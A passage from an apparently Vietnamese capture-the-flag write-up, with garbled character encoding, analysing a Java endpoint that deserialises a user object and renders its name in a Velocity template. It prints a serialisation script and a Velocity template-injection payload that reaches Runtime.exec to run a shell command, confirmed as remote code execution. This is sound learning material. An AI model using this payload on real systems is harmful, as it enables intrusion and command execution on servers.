&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;PostMapping&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;ResponseBody&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;RequestParam&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;IOException&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;hexString&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getDecoder&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;byteArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexToBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hexString&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ByteArrayInputStream&lt;/span&gt; &lt;span class="n"&gt;bis&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ByteArrayInputStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;byteArray&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ObjectInputStream&lt;/span&gt; &lt;span class="n"&gt;ois&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;SecureObjectInputStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bis&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Users&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;ois&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readObject&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getName&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;var13&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;throw&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;RuntimeException&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;var13&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;toLowerCase&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;#&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;But... For what?&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;templateString&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Hello, &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;. Today is $date&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Velocity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;init&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;VelocityContext&lt;/span&gt; &lt;span class="n"&gt;ctx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;VelocityContext&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;LocalDate&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;LocalDate&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;DateTimeFormatter&lt;/span&gt; &lt;span class="n"&gt;formatter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DateTimeFormatter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ofPattern&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;MMMM dd, yyyy&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;formattedDate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;formatter&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;date&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;formattedDate&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;StringWriter&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;StringWriter&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Velocity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;evaluate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;test&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;templateString&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;GiÃ¡ trá»‹ tá»« param &lt;code&gt;data&lt;/code&gt; Ä‘Æ°á»£c base64 decode, sau Ä‘Ã³ chuyá»ƒn tá»« dáº¡ng hex sang bytes array vÃ  Ä‘Æ°á»£c deserialize (sus)&lt;/li&gt;
&lt;li&gt;Láº¥y giÃ¡ trá»‹ name trong object thu Ä‘Æ°á»£c, vÃ  ná»‘i chuá»—i vÃ o templateString trÆ°á»›c khi render -&amp;gt; SSTI. Tuy nhiÃªn trÆ°á»›c khi Ä‘Æ°á»£c ná»‘i chuá»—i thÃ¬ giÃ¡ trá»‹ name Ä‘Æ°á»£c kiá»ƒm tra xem cÃ³ chá»©a kÃ½ tá»± &lt;code&gt;#&lt;/code&gt; khÃ´ng, náº¿u khÃ´ng cÃ³ kÃ½ tá»± nÃ y ta sáº½ khÃ´ng thá»ƒ dÃ¹ng Ä‘Æ°á»£c cÃ¡c syntax cá»§a tempalte nhÆ° &lt;code&gt;#set&lt;/code&gt;,&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;KhÃ´ng nhá»¯ng váº­y, táº¡i class &lt;code&gt;SecureObjectInputStream&lt;/code&gt; khi invoke method &lt;code&gt;resolveClass&lt;/code&gt; thÃ¬ class sáº½ kiá»ƒm tra xem class Ä‘áº§u tiÃªn pháº£i lÃ  Users thÃ¬ má»›i cho phÃ©p tiáº¿u tá»¥c vÃ o method resolveClass Ä‘á»ƒ tiáº¿p tá»¥c deserialize&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@Override
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;protected Class&amp;lt;?&amp;gt; resolveClass(ObjectStreamClass osc) throws IOException ,ClassNotFoundException{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; List&amp;lt;String&amp;gt; approvedClass = new ArrayList&amp;lt;String&amp;gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; approvedClass.add(Users.class.getName());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if(!approvedClass.contains(osc.getName())){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; throw new InvalidClassException(&amp;#34;Can not deserialize this class! &amp;#34;,osc.getName());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return super.resolveClass(osc);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;NhÃ¬n chung lÃ  Ä‘á»ƒ attack deserialize thÃ¬ khÃ³ =))&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;NhÆ°ng trÆ°á»›c háº¿t thÃ¬ mÃ¬nh cÅ©ng cáº§n pháº£i code láº¡i script Ä‘á»ƒ gen ra Ä‘Æ°á»£c data Ä‘Ã£, object Users sáº½ Ä‘i theo flow sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;serialize -&amp;gt; bytestohex -&amp;gt; base64 encode
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Resource tá»« source code gá»‘c Ä‘Ã£ cÃ³ gáº§n nhÆ° Ä‘á»§ cáº£, mÃ¬nh táº¡o thÃªm method bytesToHex táº¡i class Encode:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public static String bytesToHex(byte[] bytes) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; StringBuilder hexString = new StringBuilder(2 * bytes.length);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; for (byte b : bytes) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String hex = Integer.toHexString(b &amp;amp; 0xFF);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (hex.length() == 1) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; hexString.append(&amp;#39;0&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; hexString.append(hex);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return hexString.toString();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Main method cá»§a mÃ¬nh nhÆ° sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Users user = new Users();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;user.setName(&amp;#34;user1337&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ByteArrayOutputStream bos = new ByteArrayOutputStream();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ObjectOutputStream oos = new ObjectOutputStream(bos);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;oos.writeObject(user);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;oos.flush();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;oos.close();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;byte[] byteArray = bos.toByteArray();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;String hexString = Encode.bytesToHex(byteArray);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;String data = Base64.getEncoder().encodeToString(hexString.getBytes());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;System.out.println(data);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ta cÃ³ base64 value cá»§a giÃ¡ trá»‹ serialize lÃ  &lt;code&gt;YWNlZDAwMDU3MzcyMDAxNjYzNmY2ZDJlNjk3MzY5NzQ2NDc0NzUyZTY4Njk2ODY5MmU1NTczNjU3MjczNzA4NTI1ZDliYTNiZWZiMzAyMDAwMTRjMDAwNDZlNjE2ZDY1NzQwMDEyNGM2YTYxNzY2MTJmNmM2MTZlNjcyZjUzNzQ3MjY5NmU2NzNiNzg3MDc0MDAwODc1NzM2NTcyMzEzMzMzMzc=&lt;/code&gt;
&lt;img src="https://hackmd.io/_uploads/SyyNBsoxkl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/r19jrose1g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;Giá» mÃ¬nh cáº§n tÃ¬m cÃ¡ch Ä‘á»ƒ exploit SSTI, vá»›i viá»‡c khÃ´ng thá»ƒ sá»­ dá»¥ng dáº¥u &lt;code&gt;#&lt;/code&gt; thÃ¬ mÃ¬nh khÃ´ng thá»ƒ táº¡o Ä‘Æ°á»£c biáº¿n nÃ o Ä‘á»ƒ gá»i method tá»« biáº¿n Ä‘Ã³ ra vÃ¬ khÃ´ng dÃ¹ng Ä‘Æ°á»£c &lt;code&gt;#set()&lt;/code&gt;
MÃ¬nh chuyá»ƒn qua viá»‡c sá»­ dá»¥ng nhá»¯ng gÃ¬ mÃ¬nh cÃ³, cá»¥ thá»ƒ lÃ  biáº¿n &lt;code&gt;$date&lt;/code&gt; Ä‘Æ°á»£c khai bÃ¡o Ä‘á»“ng thá»i trong templateString, vá»›i kiá»ƒu dá»¯ liá»‡u lÃ  String. ÄÃ¢y lÃ  má»™t variable hoÃ n háº£o mÃ¬nh cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ cÃ³ thá»ƒ invoke Ä‘áº¿n Runtime.exec.
Payload mÃ¬nh tÃ¬m kiáº¿m vÃ  tham kháº£o táº¡i: &lt;a class="link" href="https://blog.csdn.net/weixin_39190897/article/details/139707252" target="_blank" rel="noopener"
&gt;https://blog.csdn.net/weixin_39190897/article/details/139707252&lt;/a&gt;
Ban Ä‘áº§u mÃ¬nh confirm bug báº±ng viá»‡c táº¡o file táº¡i /tmp:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$date.getClass().forName(&amp;#39;java.lang.Runtime&amp;#39;).getMethod(&amp;#39;getRuntime&amp;#39;,null).invoke(null,null).exec(&amp;#39;touch /tmp/1337&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ÄÆ°a nÃ³ vÃ o script vÃ  gá»­i, mÃ¬nh tháº¥y cÃ¢u lá»‡nh Ä‘Æ°á»£c thá»±c thi thÃ nh cÃ´ng vÃ¬ káº¿t quáº£ tráº£ vá» lÃ  pid cá»§a tiáº¿n trÃ¬nh thá»±c hiá»‡n táº¡o file:
&lt;img src="https://hackmd.io/_uploads/Hy0aLojgJl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
File /tmp/1337 Ä‘Ã£ xuáº¥t hiá»‡n, confirm payload RCE thÃ nh cÃ´ng:
&lt;img src="https://hackmd.io/_uploads/HkbGPssxJg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tuy Ä‘Ã£ RCE, nhÆ°ng challenge config iptables Ä‘á»ƒ cháº·n connection qua chain DROP (cÅ©ng na nÃ¡ chall niceray), nÃªn mÃ¬nh khÃ´ng reverse shell mÃ  Ä‘i tÃ¬m cÃ¡ch láº¥y ná»™i dung file flag qua webroot.
